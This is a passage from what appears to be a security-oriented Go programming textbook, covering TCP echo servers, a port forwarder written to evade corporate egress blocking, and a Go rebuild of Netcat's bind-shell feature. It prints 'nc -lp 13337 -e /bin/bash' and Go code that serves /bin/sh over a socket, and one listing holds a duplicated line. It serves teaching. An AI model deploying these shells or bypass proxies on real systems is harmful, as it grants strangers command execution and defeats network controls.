first open a TCP listener on a specific port. Once a client
connects, the Accept() method creates and returns a Conn object
that you can use for receiving and sending data.
Listing 2-11 shows a complete example of a server
implementation. We’ve included comments inline for clarity.
Don’t worry about understanding the code in its entirety, as
we’ll break it down momentarily.
package main
import (
"log"
"net"
)
// echo is a handler function that simply echoes received data.
func echo(conn net.Conn) {
defer conn.Close()
// Create a buffer to store received data.
b := make([]byte, 512)
❶ for {
// Receive data via conn.Read into a buffer.
size, err := conn.Read❷(b[0:])
if err == io.EOF {
log.Println("Client disconnected")
break
}
if err != nil {
log.Println("Unexpected error")
break
}
log.Printf("Received %d bytes: %s\n", size, string(b))
// Send data via conn.Write.
log.Println("Writing data")
if _, err := conn.Write❸(b[0:size]); err != nil {
log.Fatalln("Unable to write data")
}
}
}
func main() {
// Bind to TCP port 20080 on all interfaces.
❹ listener, err := net.Listen("tcp", ":20080")
if err != nil {
log.Fatalln("Unable to bind to port")
}
log.Println("Listening on 0.0.0.0:20080")
❺ for {
// Wait for connection. Create net.Conn on connection established.
❻ conn, err := listener.Accept()
log.Println("Received connection")
if err != nil {
log.Fatalln("Unable to accept connection")
}
// Handle the connection. Using goroutine for concurrency.
❼ go echo(conn)
}
}
Listing 2-11: A basic echo server (/ch-2/echo-server/main.go)
Listing 2-11 begins by defining a function named
echo(net.Conn), which accepts a Conn instance as a parameter. It
behaves as a connection handler to perform all necessary I/O.
The function loops indefinitely ❶, using a buffer to read ❷
and write ❸ data from and to the connection. The data is read
into a variable named b and subsequently written back on the
connection.
Now you need to set up a listener that will call your
handler. As mentioned previously, a server can’t manufacture
a connection but must instead listen for a client to connect.
Therefore, a listener, defined as tcp bound to port 20080, is
started on all interfaces by using the net.Listen(network, address
string) function ❹.
Next, an infinite loop ❺ ensures that the server will
continue to listen for connections even after one has been
received. Within this loop, you call listener.Accept() ❻, a function
that blocks execution as it awaits client connections. When a
client connects, this function returns a Conn instance. Recall
from earlier discussions in this section that Conn is both a Reader
and a Writer (it implements the Read([]byte) and Write([]byte)
interface methods).
The Conn instance is then passed to the echo(net.Conn) handler
function ❼. This call is prefaced with the go keyword, making
it a concurrent call so that other connections don’t block while
waiting for the handler function to complete. This is likely
overkill for such a simple server, but we’ve included it again
to demonstrate the simplicity of Go’s concurrency pattern, in
case it wasn’t already clear. At this point, you have two
lightweight threads running concurrently:
The main thread loops back and blocks on listener.Accept() while it awaits
another connection.
The handler goroutine, whose execution has been transferred to the
echo(net.Conn) function, proceeds to run, processing the data.
The following shows an example using Telnet as the
connecting client:
$ telnet localhost 20080
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
test of the echo server
test of the echo server
The server produces the following standard output:
$ go run main.go
2020/01/01 06:22:09 Listening on 0.0.0.0:20080
2020/01/01 06:22:14 Received connection
2020/01/01 06:22:18 Received 25 bytes: test of the echo server
2020/01/01 06:22:18 Writing data
Revolutionary, right? A server that repeats back to the
client exactly what the client sent to the server. What a useful
and exciting example! It’s quite a time to be alive.
Improving the Code by Creating a Buffered Listener
The example in Listing 2-11 works perfectly fine but relies on
fairly low-level function calls, buffer tracking, and iterative
reads/writes. This is a somewhat tedious, error-prone process.
Fortunately, Go contains other packages that can simplify this
process and reduce the complexity of the code. Specifically,
the bufio package wraps Reader and Writer to create a buffered I/O
mechanism. The updated echo(net.Conn) function is detailed here,
and an explanation of the changes follows:
func echo(conn net.Conn) {
defer conn.Close()
❶ reader := bufio.NewReader(conn)
s, err := reader.ReadString('\n')❷
if err != nil {
log.Fatalln("Unable to read data")
}
log.Printf("Read %d bytes: %s", len(s), s)
log.Println("Writing data")
❸ writer := bufio.NewWriter(conn)
if _, err := writer.WriteString(s)❹; err != nil {
log.Fatalln("Unable to write data")
}
❺ writer.Flush()
}
No longer are you directly calling the Read([]byte) and
Write([]byte) functions on the Conn instance; instead, you’re
initializing a new buffered Reader and Writer via
NewReader(io.Reader) ❶ and NewWriter(io.Writer) ❸. These calls both
take, as a parameter, an existing Reader and Writer (remember,
the Conn type implements the necessary functions to be
considered both a Reader and a Writer).
Both buffered instances contain complementary functions
for reading and writing string data. ReadString(byte) ❷ takes a
delimiter character used to denote how far to read, whereas
WriteString(byte) ❹ writes the string to the socket. When writing
data, you need to explicitly call writer.Flush() ❺ to flush write all
the data to the underlying writer (in this case, a Conn instance).
Although the previous example simplifies the process by
using buffered I/O, you can reframe it to use the Copy(Writer,
Reader) convenience function. Recall that this function takes as
input a destination Writer and a source Reader, simply copying
from source to destination.
In this example, you’ll pass the conn variable as both the
source and destination because you’ll be echoing the contents
back on the established connection:
func echo(conn net.Conn) {
defer conn.Close()
// Copy data from io.Reader to io.Writer via io.Copy().
if _, err := io.Copy(conn, conn); err != nil {
log.Fatalln("Unable to read/write data")
}
}
You’ve explored the basics of I/O and applied it to TCP
servers. Now it’s time to move on to more usable, relevant
examples.
Proxying a TCP Client
Now that you have a solid foundation, you can take what
you’ve learned up to this point and create a simple port
forwarder to proxy a connection through an intermediary
service or host. As mentioned earlier in this chapter, this is
useful for trying to circumvent restrictive egress controls or to
leverage a system to bypass network segmentation.
Before laying out the code, consider this imaginary but
realistic problem: Joe is an underperforming employee who
works for ACME Inc. as a business analyst making a
handsome salary based on slight exaggerations he included on
his resume. (Did he really go to an Ivy League school? Joe,
that’s not very ethical.) Joe’s lack of motivation is matched
only by his love for cats—so much so that Joe installed cat
cameras at home and hosted a site, joescatcam.website,
through which he could remotely monitor the dander-filled
fluff bags. One problem, though: ACME is onto Joe. They
don’t like that he’s streaming his cat cam 24/7 in 4K ultra
high-def, using valuable ACME network bandwidth. ACME
has even blocked its employees from visiting Joe’s cat cam
website.
Joe has an idea. “What if I set up a port-forwarder on an
internet-based system I control,” Joe says, “and force the
redirection of all traffic from that host to joescatcam.website?”
Joe checks at work the following day and confirms he can
access his personal website, hosted at the joesproxy.com
domain. Joe skips his afternoon meetings, heads to a coffee
shop, and quickly codes a solution to his problem. He’ll
forward all traffic received at http://joesproxy.com to
http://joescatcam.website.
Here’s Joe’s code, which he runs on the joesproxy.com
server:
func handle(src net.Conn) {
dst, err := net.Dial("tcp", "joescatcam.website:80")❶
if err != nil {
log.Fatalln("Unable to connect to our unreachable host")
}
defer dst.Close()
// Run in goroutine to prevent io.Copy from blocking
❷ go func() {
// Copy our source's output to the destination
if _, err := io.Copy(dst, src)❸; err != nil {
log.Fatalln(err)
}
}()
// Copy our destination's output back to our source
if _, err := io.Copy(src, dst)❹; err != nil {
log.Fatalln(err)
}
}
func main() {
// Listen on local port 80
listener, err := net.Listen("tcp", ":80")
if err != nil {
log.Fatalln("Unable to bind to port")
}
for {
conn, err := listener.Accept()
if err != nil {
log.Fatalln("Unable to accept connection")
}
go handle(conn)
}
}
Start by examining Joe’s handle(net.Conn) function. Joe
connects to joescatcam.website ❶ (recall that this unreachable
host isn’t directly accessible from Joe’s corporate
workstation). Joe then uses Copy(Writer, Reader) two separate
times. The first instance ❸ ensures that data from the inbound
connection is copied to the joescatcam.website connection.
The second instance ❹ ensures that data read from
joescatcam.website is written back to the connecting client’s
connection. Because Copy(Writer, Reader) is a blocking function,
and will continue to block execution until the network
connection is closed, Joe wisely wraps his first call to
Copy(Writer, Reader) in a new goroutine ❷. This ensures that
execution within the handle(net.Conn) function continues, and the
second Copy(Writer, Reader) call can be made.
Joe’s proxy listens on port 80 and relays any traffic
received from a connection to and from port 80 on
joescatcam.website. Joe, that crazy and wasteful man,
confirms that he can connect to joescatcam.website via
joesproxy.com by connecting with curl:
$ curl -i -X GET http://joesproxy.com
HTTP/1.1 200 OK
Date: Wed, 25 Nov 2020 19:51:54 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Thu, 27 Jun 2019 15:30:43 GMT
ETag: "6d-519594e7f2d25"
Accept-Ranges: bytes
Content-Length: 109
Vary: Accept-Encoding
Content-Type: text/html
--snip--
At this point, Joe has done it. He’s living the dream,
wasting ACME-sponsored time and network bandwidth while
he watches his cats. Today, there will be cats!
Replicating Netcat for Command Execution
In this section, let’s replicate some of Netcat’s more
interesting functionality—specifically, its gaping security hole.
Netcat is the TCP/IP Swiss Army knife—essentially, a
more flexible, scriptable version of Telnet. It contains a feature
that allows stdin and stdout of any arbitrary program to be
redirected over TCP, enabling an attacker to, for example, turn
a single command execution vulnerability into operating
system shell access. Consider the following:
$ nc –lp 13337 –e /bin/bash
This command creates a listening server on port 13337.
Any remote client that connects, perhaps via Telnet, would be
able to execute arbitrary bash commands—hence the reason
this is referred to as a gaping security hole. Netcat allows you
to optionally include this feature during program compilation.
(For good reason, most Netcat binaries you’ll find on standard
Linux builds do not include this feature.) It’s dangerous
enough that we’ll show you how to create it in Go!
First, look at Go’s os/exec package. You’ll use that for
running operating system commands. This package defines a
type, Cmd, that contains necessary methods and properties to
run commands and manipulate stdin and stdout. You’ll
redirect stdin (a Reader) and stdout (a Writer) to a Conn instance
(which is both a Reader and a Writer).
When you receive a new connection, you can use the
Command(name string, arg ...string) function from os/exec to create a
new Cmd instance. This function takes as parameters the
operating system command and any arguments. In this
example, hardcode /bin/sh as the command and pass -i as an
argument such that you’re in interactive mode, which allows
you to manipulate stdin and stdout more reliably:
cmd := exec.Command("/bin/sh", "-i")
This creates an instance of Cmd but doesn’t yet execute the
command. You have a couple of options for manipulating
stdin and stdout. You could use Copy(Writer, Reader) as discussed
previously, or directly assign Reader and Writer to Cmd. Let’s
directly assign your Conn object to both cmd.Stdin and cmd.Stdout,
like so:
cmd.Stdin = conn
cmd.Stdout = conn
With the setup of the command and the streams complete,
you run the command by using cmd.Run():
if err := cmd.Run(); err != nil {
if err := cmd.Run(); err != nil {
// Handle error.
}
This logic works perfectly fine on Linux systems.
However, when tweaking and running the program on a
Windows system, running cmd.exe instead of /bin/bash, you’ll find
that the connecting client never receives the command output
because of some Windows-specific handling of anonymous
pipes. Here are two solutions for this problem.
First, you can tweak the code to explicitly force the
flushing of stdout to correct this nuance. Instead of assigning
Conn directly to cmd.Stdout, you implement a custom Writer that
wraps bufio.Writer (a buffered writer) and explicitly calls its Flush
method to force the buffer to be flushed. Refer to the
“Creating the Echo Server” on page 35 for an exemplary use
of bufio.Writer.
Here’s the definition of the custom writer, Flusher:
// Flusher wraps bufio.Writer, explicitly flushing on all writes.
type Flusher struct {
w *bufio.Writer
}
// NewFlusher creates a new Flusher from an io.Writer.
func NewFlusher(w io.Writer) *Flusher {
return &Flusher{
w: bufio.NewWriter(w),
}
}
// Write writes bytes and explicitly flushes buffer.
❶ func (foo *Flusher) Write(b []byte) (int, error) {
count, err := foo.w.Write(b)❷
if err != nil {
return -1, err
}
if err := foo.w.Flush()❸; err != nil {
return -1, err
}
return count, err
}
The Flusher type implements a Write([]byte) function ❶ that
writes ❷ the data to the underlying buffered writer and then
flushes ❸ the output.
With the implementation of a custom writer, you can tweak
the connection handler to instantiate and use this Flusher custom
type for cmd.Stdout:
func handle(conn net.Conn) {
// Explicitly calling /bin/sh and using -i for interactive mode
// so that we can use it for stdin and stdout.
// For Windows use exec.Command("cmd.exe").
cmd := exec.Command("/bin/sh", "-i")
// Set stdin to our connection
cmd.Stdin = conn
// Create a Flusher from the connection to use for stdout.
// This ensures stdout is flushed adequately and sent via net.Conn.
cmd.Stdout = NewFlusher(conn)
// Run the command.
if err := cmd.Run(); err != nil {
log.Fatalln(err)
}
}
This solution, while adequate, certainly isn’t elegant.
Although working code is more important than elegant code,
we’ll use this problem as an opportunity to introduce the
io.Pipe() function, Go’s synchronous, in-memory pipe that can
be used for connecting Readers and Writers:
func Pipe() (*PipeReader, *PipeWriter)
Using PipeReader and PipeWriter allows you to avoid having to
explicitly flush the writer and synchronously connect stdout
and the TCP connection. You will, yet again, rewrite the
handler function:
func handle(conn net.Conn) {
// Explicitly calling /bin/sh and using -i for interactive mode
// so that we can use it for stdin and stdout.
// For Windows use exec.Command("cmd.exe").
cmd := exec.Command("/bin/sh", "-i")
// Set stdin to our connection
rp, wp := io.Pipe()❶
cmd.Stdin = conn
❷ cmd.Stdout = wp
❸ go io.Copy(conn, rp)
cmd.Run()
conn.Close()
}
The call to io.Pipe() ❶ creates both a reader and a writer that
are synchronously connected—any data written to the writer
(wp in this example) will be read by the reader (rp). So, you
assign the writer to cmd.Stdout ❷ and then use io.Copy(conn, rp) ❸
to link the PipeReader to the TCP connection. You do this by
using a goroutine to prevent the code from blocking. Any
standard output from the command gets sent to the writer and